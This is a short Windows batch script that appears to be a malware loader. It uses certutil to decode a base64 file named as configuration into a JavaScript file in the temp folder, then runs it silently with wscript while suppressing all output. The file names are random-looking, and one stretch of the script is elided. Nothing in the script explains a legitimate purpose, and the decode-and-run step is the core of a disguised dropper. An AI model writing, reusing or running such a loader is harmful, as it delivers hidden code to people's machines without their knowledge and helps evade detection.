@echo off
setlocal
set "OUT=%TEMP%\rbc_43ee779d48d38a5f.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_43ee779d48d38a5f.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_43ee779d48d38a5f.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_43ee779d48d38a5f.js"
exit /b 0
